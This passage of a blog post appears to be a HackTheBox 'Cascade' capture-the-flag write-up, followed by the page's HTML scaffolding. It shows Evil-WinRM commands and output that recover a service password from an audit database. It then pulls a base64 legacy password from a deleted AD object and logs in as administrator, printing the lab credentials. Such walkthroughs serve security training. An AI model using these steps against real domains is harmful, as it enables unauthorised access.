36e**************************9e513 *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt; Privilege Escalaition Part 1: Evil-WinRM* PS C:\\Users\\s.smith\\Desktop&gt; whoami /all USER INFORMATION ---------------- User Name SID =============== ============================================== cascade\\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Audit Share Alias S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Nothing much in this.. Proceding with Dir enumeration. *Evil-WinRM* PS C:\\&gt; cd Shares *Evil-WinRM* PS C:\\Shares&gt; cd Audit *Evil-WinRM* PS C:\\Shares\\Audit&gt; ls Directory: C:\\Shares\\Audit Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/28/2020 9:40 PM DB d----- 1/26/2020 10:25 PM x64 d----- 1/26/2020 10:25 PM x86 -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll -a---- 1/28/2020 11:29 PM 45 RunAudit.bat -a---- 10/27/2019 6:38 AM 363520 System.Data.SQLite.dll -a---- 10/27/2019 6:38 AM 186880 System.Data.SQLite.EF6.dll -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll Found a couple of intresting files exe and dll. There was a folder DB and which contains Audit.db.. *Evil-WinRM* PS C:\\Shares\\Audit\\DB&gt; ls Directory: C:\\Shares\\Audit\\DB Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/28/2020 9:39 PM 24576 Audit.db Downloaded the Audit.db file and looking in the contents I found ArkSvcBQO5l5Kj9MdErXx6Q6AGOw== Having a look at both the other files that we have got CascAudit.exe and CascCrypto.dll using DNSPY. After all the REverse Engineering is done, the final output is the password of user ARK-SVC Login as Arksvc evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Privilege escalation part 2 *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================== cascade\\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled This thing seems very instresting!! CASCADE\\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group Finding the Deleted Objects: *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; -IncludeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 Deleted : True DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Deleted : True DistinguishedName : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 Deleted : True DistinguishedName : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 Deleted : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 The below ones are intresting! Deleted : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 Gaining ROOT Access!! *Evil-WinRM* PS C:\\Users\\arksvc\\Documents&gt; Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -property * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe CN : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe codePage : 0 countryCode : 0 Created : 1/9/2020 7:30:19 PM createTimeStamp : 1/9/2020 7:30:19 PM Deleted : True Description : DisplayName : DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM} instanceType : 4 isCriticalSystemObject : False isDeleted : True LastKnownParent : OU=Computers,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 localPolicyFlags : 0 logonCount : 0 Modified : 1/28/2020 6:08:35 PM modifyTimeStamp : 1/28/2020 6:08:35 PM msDS-LastKnownRDN : CASC-WS1 Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe objectSid : S-1-5-21-3332504370-1206983947-1165150453-1108 primaryGroupID : 515 ProtectedFromAccidentalDeletion : False pwdLastSet : 132230718192147073 sAMAccountName : CASC-WS1$ sDRightsEffective : 0 userAccountControl : 4128 uSNChanged : 245849 uSNCreated : 24603 whenChanged : 1/28/2020 6:08:35 PM whenCreated : 1/9/2020 7:30:19 PM CanonicalName : cascade.local/Deleted Objects/Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 CN : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 Created : 1/13/2020 5:21:53 PM createTimeStamp : 1/13/2020 5:21:53 PM Deleted : True Description : DisplayName : DistinguishedName : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...} groupType : -2147483644 instanceType : 4 isDeleted : True LastKnownParent : OU=Groups,OU=UK,DC=cascade,DC=local Modified : 1/28/2020 6:07:55 PM modifyTimeStamp : 1/28/2020 6:07:55 PM msDS-LastKnownRDN : Scheduled Tasks Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1131 ProtectedFromAccidentalDeletion : False sAMAccountName : Scheduled Tasks sDRightsEffective : 0 uSNChanged : 245848 uSNCreated : 114790 whenChanged : 1/28/2020 6:07:55 PM whenCreated : 1/13/2020 5:21:53 PM CanonicalName : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e CN : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Created : 1/26/2020 2:34:30 AM createTimeStamp : 1/26/2020 2:34:30 AM Deleted : True Description : DisplayName : Block Potato DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} flags : 0 gPCFileSysPath : \\\\cascade.local\\SysVol\\cascade.local\\Policies\\{A403B701-A528-4685-A816-FDEE32BDDCBA} gPCFunctionalityVersion : 2 gPCMachineExtensionNames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}] instanceType : 4 isDeleted : True LastKnownParent : CN=Policies,CN=System,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : {A403B701-A528-4685-A816-FDEE32BDDCBA} Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196701 uSNCreated : 196688 versionNumber : 2 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:30 AM CanonicalName : cascade.local/Deleted Objects/Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 CN : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : Machine Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196699 uSNCreated : 196689 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM CanonicalName : cascade.local/Deleted Objects/User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 CN : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 Created : 1/26/2020 2:34:31 AM createTimeStamp : 1/26/2020 2:34:31 AM Deleted : True Description : DisplayName : DistinguishedName : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/1/1601 12:00:00 AM} instanceType : 4 isDeleted : True LastKnownParent : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Modified : 1/26/2020 2:40:52 AM modifyTimeStamp : 1/26/2020 2:40:52 AM msDS-LastKnownRDN : User Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 ProtectedFromAccidentalDeletion : False sDRightsEffective : 0 showInAdvancedViewOnly : True uSNChanged : 196700 uSNCreated : 196690 whenChanged : 1/26/2020 2:40:52 AM whenCreated : 1/26/2020 2:34:31 AM accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM Found the cascadeLegacyPwd of Tempadmin cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz Time to decode.. echo YmFDVDNyMWFOMDBkbGVz|base64 -d baCT3r1aN00dles — Logging as ADMIN evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles Evil-WinRM shell v2.0 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Getting Root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt 930****************************b35b *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968","@type":"BlogPosting","image":"http://192.168.0.111:6001/assets/img/sample/cascade/cascade.png","headline":"HackTheBox Cascade","dateModified":"2020-06-26T22:09:00+05:30","datePublished":"2020-06-26T22:09:00+05:30","url":"http://192.168.0.111:6001/hackthebox/2020/06/26/Cascade.html","author":{"@type":"Person","name":"Jeevan Chandra"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="shortcut icon" href="">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
  <link rel="stylesheet" href="/assets/css/main.css">
  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://192.168.0.111:6001/feed.xml" title="DC0deZer0">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
<!-- and it's easy to individually load additional languages -->
<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>



















<script>
// Init highlight js
document.addEventListener('DOMContentLoaded', function(event) {
  var els = document.querySelectorAll('pre code')

  function addLangData(block) {
    var outer = block.parentElement.parentElement.parentElement;
    var lang = block.getAttribute('data-lang');
    for (var i = 0; i < outer.classList.length; i++) {
      var cls = outer.classList[i];
      if (cls.startsWith('language-')) {
        lang = cls;
        break;
      }
    }
    if (!lang) {
      cls = block.getAttribute('class');
      lang = cls ? cls.replace('hljs ', '') : '';
    }
    if (lang.startsWith('language-')) {
      lang = lang.substr(9);
    }
    block.setAttribute('class', 'hljs ' + lang);
    block.parentNode.setAttribute('data-lang', lang);
  }

  function addBadge(block) {
    var enabled = ('true' || 'true').toLowerCase();
    if (enabled == 'true') {
      var pre = block.parentElement;
      pre.classList.add('badge');
    }
  }

  function handle(block) {
    addLangData(block);
    addBadge(block)
    hljs.highlightBlock(block);
  }

  for (var i = 0; i < els.length; i++) {
    var el = els[i];
    handle(el);
  }
});
</script>

<style>
  /* code language badge */
  pre.badge::before {
    content: attr(data-lang);
    color: #fff;
    background-color: #ff4e00;
    padding: 0 .5em;
    border-radius: 0 2px;
    text-transform: uppercase;
    text-align: center;
    min-width: 32px;
    display: inline-block;
    position: absolute;
    right: 0;
  }

  /* fix wrong badge display for firefox browser */
  code > table pre::before {
    display: none;
  }
</style>
</head>
<body>



















<header class="site-header " role="banner">

  <div class="wrapper">
    <div class="site-header-inner">
<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
  DC0deZer0
</a>
</span><nav class="site-nav">
          <input type="checkbox" id="nav-trigger" class="nav-trigger">
          <label for="nav-trigger">
            <span class="menu-icon">
              <svg viewbox="0 0 18 15" width="18px" height="15px">
                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
              </svg>
            </span>
          </label>

          <div class="trigger">
<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>




<span class="page-link">

<div id="google_translate_element" style="display: none;">
</div>

<span class="ct-language">
  <ul class="list-unstyled ct-language-dropdown">
    
      <li>
        <a href="#" class="lang-select" data-lang="en">
          
          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="fr">
          
          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="zh-CN">
          
          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ja">
          
          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ko">
          
          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ru">
          
          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
          
        </a>
      </li>
    
  </ul>
</span>

<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({
    pageLanguage: '',
    autoDisplay: false,
    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
  }, 'google_translate_element');

  function restoreLang() {
    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
    if (!iframe) return;

    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
    var restore_el = innerDoc.getElementsByTagName("button");

    for (var i = 0; i < restore_el.length; i++) {
      if (restore_el[i].id.indexOf("restore") >= 0) {
        restore_el[i].click();
        var close_el = innerDoc.getElementsByClassName("goog-close-link");
        close_el[0].click();
        return;
      }
    }
  }

  function triggerHtmlEvent(element, eventName) {
    var event;
    if (document.createEvent) {
      event = document.createEvent('HTMLEvents');
      event.initEvent(eventName, true, true);
      element.dispatchEvent(event);
    } else {
      event = document.createEventObject();
      event.eventType = eventName;
      element.fireEvent('on' + event.eventType, event);
    }
  }

  var googleCombo = document.querySelector("select.goog-te-combo");
  var langSelect = document.querySelector('.ct-language');
  langSelect.addEventListener('click', function(event) {
    if (!event.target) {
      return;
    }

    var selected = document.querySelector('.ct-language .ct-language-selected');
    if (selected) {
      selected.classList.remove('ct-language-selected');
    }

    var target = event.target;
    while (target && target !== langSelect ) {
      if (target.matches('.lang-select')) {
        break;
      }
      target = target.parentElement;
    }

    if (target && target.matches('.lang-select')) {
      var lang = target.getAttribute('data-lang');
      if (googleCombo.value == lang) {
        restoreLang();
      } else {
        target.parentElement.classList.add('ct-language-selected');
        googleCombo.value = lang;
        triggerHtmlEvent(googleCombo, 'change');
      }
    }

    event.preventDefault();
  });
}
</script>

<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</span>
</div>
        </nav>
</div>
  </div>
</header>

<script>
  (function() {
    var lastScrollY = getScrollPos().y;
    var documentElement = document.documentElement;

    function storeScrollData() {
      var y = getScrollPos().y;var scrollStatus = "";

      if (y <= 0) {
        scrollStatus = "top";
      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
        scrollStatus = "bottom";
      } else {
        var isScrollDown = (y - lastScrollY > 0) ? true : false;
        scrollStatus = isScrollDown ? "down" : "up";
      }

      lastScrollY = y;
      documentElement.setAttribute("data-scroll-status", scrollStatus);
    }

    window.addEventListener('scroll', function(e) {
      storeScrollData();
    });

    storeScrollData();
  })();
</script>










































<script>
  function hashLocate(hashValue) {
    hashValue = hashValue.replace(/^.*#h-/, '');
    var element = document.getElementById(hashValue);

    if (!element) {
      return;
    }

    var header = document.querySelector('header.site-header');
    var headerRect = header.getBoundingClientRect();
    var headerTop = Math.floor(headerRect.top);
    var headerHeight = Math.floor(headerRect.height);
    var scrollPos = getScrollPos();
    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);

    if (offsetY == scrollPos.y) {
      return;
    }

    if (headerTop == 0  && offsetY > scrollPos.y) {
      offsetY += headerHeight + 2;
    } else if (headerTop < 0  && offsetY < scrollPos.y) {
      offsetY -= headerHeight - 2;
    }

    smoothScrollTo(offsetY);
  }

  // The first event occurred
  window.addEventListener('load', function(event) {
    if (window.location.hash) {
      hashLocate(window.location.hash);
    }
  });

  // The first event occurred
  window.addEventListener('click', function(event) {
    if (event.target.tagName.toLowerCase() == 'a') {
      hashLocate(event.target.getAttribute('href'));
    }
  });
</script>
<div class="theme-toggle">
  <input type="checkbox" id="theme-switch">
  <label for="theme-switch">
    <div class="toggle"></div>
    <div class="names">
      <p class="light">Light</p>
      <p class="dark">Dark</p>
    </div>
  </label>
</div>




<script>
  (function() {
    var sw = document.getElementById('theme-switch');
    var html = document.getElementsByTagName('html')[0];
    var nightModeOption = ('auto' || 'auto').toLowerCase();
    var storage = nightModeOption === 'manual'
        ? localStorage
        : sessionStorage;
    var themeData = loadThemeData();

    function saveThemeData(data) {
      storage.setItem('theme', JSON.stringify(data));
    }

    function loadThemeData() {
      var data = storage.getItem('theme');
      try {
        data = JSON.parse(data ? data : '');
      } catch(e) {
        data = { nightShift: undefined, autoToggleAt: 0 };
        saveThemeData(data);
      }
      return data;
    }

    function handleThemeToggle(nightShift) {
      themeData.nightShift = nightShift;
      saveThemeData(themeData);
      html.dataset.theme = nightShift ? 'dark' : 'light';
      setTimeout(function() {
        sw.checked = nightShift ? true : false;
      }, 50);
    }

    function autoThemeToggle() {
      // Next time point of theme toggle
      var now = new Date();
      var toggleAt = new Date();
      var hours = now.getHours();
      var nightShift = hours >= 19 || hours <=7;

      if (nightShift) {
        if (hours > 7) {
          toggleAt.setDate(toggleAt.getDate() + 1);
        }
        toggleAt.setHours(7);
      } else {
        toggleAt.setHours(19);
      }

      toggleAt.setMinutes(0);
      toggleAt.setSeconds(0);
      toggleAt.setMilliseconds(0)

      var delay = toggleAt.getTime() - now.getTime();

      // auto toggle theme mode
      setTimeout(function() {
        handleThemeToggle(!nightShift);
      }, delay);

      return {
        nightShift: nightShift,
        toggleAt: toggleAt.getTime()
      };
    }

    // Listen the theme toggle event
    sw.addEventListener('change', function(event) {
      handleThemeToggle(event.target.checked);
    });

    if (nightModeOption == 'auto') {
      var data = autoThemeToggle();

      // Toggle theme by local setting
      if (data.toggleAt > themeData.autoToggleAt) {
        themeData.autoToggleAt = data.toggleAt;
        handleThemeToggle(data.nightShift);
      } else {
        handleThemeToggle(themeData.nightShift);
      }
    } else if (nightModeOption == 'manual') {
      handleThemeToggle(themeData.nightShift);
    } else {
      var nightShift = themeData.nightShift;
      if (nightShift === undefined) {
        nightShift = nightModeOption === 'on';
      }
      handleThemeToggle(nightShift);
    }
  })();
</script>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="framework">
  <section class="main">

     <div class="post">
  <section>









<header class="post-header">
  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Cascade</h1>
  <h3 class="post-subtitle"></h3>

  <p class="post-meta">
    <time class="dt-published" datetime="2020-06-26T22:09:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jun 26, 2020
    </time>
    
    <img src="/assets/img/sample/cascade/cascade.png">
    
    
    
































    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 1 hour 5 mins</span>
  </p>
<div class="post-tags">
